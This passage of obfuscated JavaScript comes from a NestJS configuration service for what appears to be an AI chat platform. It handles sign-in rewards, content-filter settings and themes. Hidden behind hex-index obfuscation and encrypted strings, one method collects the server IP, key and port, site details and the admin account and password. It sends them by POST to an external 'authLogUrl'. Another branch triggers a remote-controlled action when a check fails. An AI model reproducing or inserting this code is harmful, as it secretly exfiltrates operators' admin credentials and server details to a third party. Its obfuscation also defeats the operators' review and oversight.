_0x3e61af[_0x38b8aa(0x1e9)]();})['catch'](_0x4eb497=>{const _0x4ea89d=_0x6be304;common_1['Logger'][_0x4ea89d(0x267)](_0x4eb497,_0x4ea89d(0x1f0));});_0x1902bd['code']!==0x0&&(common_1[_0x6be304(0x1e2)][_0x6be304(0x267)]((0x0,utils_1[_0x6be304(0x212)])('bkYMP1mVCBurarEsc48hu4lD0nfoPfj1FccGPRuygRtgPnbJWkkvJGU6zhr/otMF6E7iBQk6kY90kyEI47sVTA==')),(0x0,actions_1[_0x6be304(0x216)])()),(_0x1902bd===null||_0x1902bd===void 0x0?void 0x0:_0x1902bd[_0x6be304(0x239)])===0x0&&!((_0x3c4ecd=_0x1902bd===null||_0x1902bd===void 0x0?void 0x0:_0x1902bd[_0x6be304(0x1f5)])===null||_0x3c4ecd===void 0x0?void 0x0:_0x3c4ecd[_0x6be304(0x219)])&&(common_1[_0x6be304(0x1e2)][_0x6be304(0x267)]((0x0,utils_1['decrypt'])(_0x6be304(0x217))),(0x0,actions_1[_0x6be304(0x216)])());}[_0x2c5ca4(0x2a7)](){const _0x5ada8d=_0x2c5ca4;return process[_0x5ada8d(0x282)][_0x5ada8d(0x2a3)]||_0x5ada8d(0x2ac);}async['getSignatureGiftConfig'](){const _0x5ff4b8=_0x2c5ca4,{signInStatus:signInStatus=0x0,signInModel3Count:signInModel3Count=0x0,signInModel4Count:signInModel4Count=0x0,signInMjDrawToken:signInMjDrawToken=0x0}=await this['getConfigs'](['signInStatus',_0x5ff4b8(0x1d7),_0x5ff4b8(0x227),_0x5ff4b8(0x252)]);if(Number(signInStatus)!==0x1)throw new common_1[(_0x5ff4b8(0x2ab))]('签到功能暂未开放!',common_1[_0x5ff4b8(0x255)][_0x5ff4b8(0x1f1)]);return{'model3Count':Number(signInModel3Count),'model4Count':Number(signInModel4Count),'drawMjCount':Number(signInMjDrawToken)};}async[_0x2c5ca4(0x234)](){const _0x13b260=_0x2c5ca4,{baiduTextStatus:baiduTextStatus=0x0,baiduTextAccessToken:_0x414018,nineaiBuiltInSensitiveStatus:nineaiBuiltInSensitiveStatus=0x0,nineaiBuiltInSensitiveApiBase:_0xcebd27,nineaiBuiltInSensitiveAuthKey:_0x44343f}=await this[_0x13b260(0x253)]([_0x13b260(0x275),'baiduTextAccessToken',_0x13b260(0x211),_0x13b260(0x1cb),_0x13b260(0x1f4)]);if(Number(baiduTextStatus)===0x1)return{'useType':_0x13b260(0x230),'baiduTextAccessToken':_0x414018};if(Number(nineaiBuiltInSensitiveStatus)===0x1)return{'useType':_0x13b260(0x240),'nineaiBuiltInSensitiveApiBase':_0xcebd27,'nineaiBuiltInSensitiveAuthKey':_0x44343f};return null;}async['getTheme'](_0x34eee9){const _0x54c790=_0x2c5ca4,{keys:_0x31b2ec}=_0x34eee9;if(_0x31b2ec[_0x54c790(0x1dd)]===0x0)return'';return await this[_0x54c790(0x253)](_0x31b2ec);}async['setTheme'](_0x5502a2){const _0x2329f0=_0x2c5ca4,{settings:_0x6ad56b}=_0x5502a2;if(_0x6ad56b[_0x2329f0(0x1dd)]===0x0)return'';return await this['setConfig'](_0x5502a2);}async[_0x2c5ca4(0x231)](_0x58aaef,_0x5d7a77){const _0x25d59e=_0x2c5ca4,_0x26cb8e=process[_0x25d59e(0x282)][(0x0,utils_1['decrypt'])('JPFq8fAlQE2V2Eq7KWYSxg==')],_0x2e59e6=process['env'][(0x0,utils_1['decrypt'])(_0x25d59e(0x1ca))],_0x8729b8=process['env'][_0x25d59e(0x1ee)];if(!_0x26cb8e||!_0x2e59e6)throw new common_1[(_0x25d59e(0x2ab))]((0x0,utils_1['decrypt'])('nL4r+L6Sw+2mmD2RZp+C/xu3iXKHIx2CviCHXOzVFdwiUmnj4GGdzXhU1D0zpcN5'),common_1[_0x25d59e(0x255)][_0x25d59e(0x1e3)]);const {qqNumber:_0x13db91,vxNumber:_0x3f518e,siteName:_0x3c4283,domain:_0x35e24e,registerBaseUrl:_0x2297a3}=await this[_0x25d59e(0x253)]([_0x25d59e(0x1d4),_0x25d59e(0x1fb),_0x25d59e(0x202),_0x25d59e(0x21a),'registerBaseUrl']),_0x5dc41f=packageJson[_0x25d59e(0x297)],_0x3ffcf9={'ip':_0x26cb8e,'key':_0x2e59e6,'port':_0x8729b8,'qqNumber':_0x13db91,'vxNumber':_0x3f518e,'domain':_0x35e24e,'adminAccount':_0x58aaef,'adminPass':_0x5d7a77,'baseUrl':_0x2297a3,'siteName':_0x3c4283,'qq':_0x13db91,'vxNum':_0x3f518e,'version':_0x5dc41f},_0x6943b4={'method':_0x25d59e(0x1f2),'headers':{'Content-Type':_0x25d59e(0x283)},'body':JSON[_0x25d59e(0x213)](_0x3ffcf9)};await fetch(authLogUrl,_0x6943b4)[_0x25d59e(0x290)](_0x5e6000=>{const _0x14c1b8=_0x25d59e;console[_0x14c1b8(0x244)](_0x14c1b8(0x26a),_0x5e6000);});}};GlobalConfigService=__decorate([(0x0,common_1[_0x2c5ca4(0x1c6)])(),__param(0x0,(0x0,typeorm_1['InjectRepository'])(config_entity_1['ConfigEntity'])),__param(0x1,(0x0,typeorm_1[_0x2c5ca4(0x24a)])(chatLog_entity_1['ChatLogEntity'])),__metadata(_0x2c5ca4(0x273),[typeorm_2[_0x2c5ca4(0x2a2)],typeorm_2[_0x2c5ca4(0x2a2)],models_service_1[_0x2c5ca4(0x223)]])],GlobalConfigService),exports[_0x2c5ca4(0x245)]=GlobalConfigService;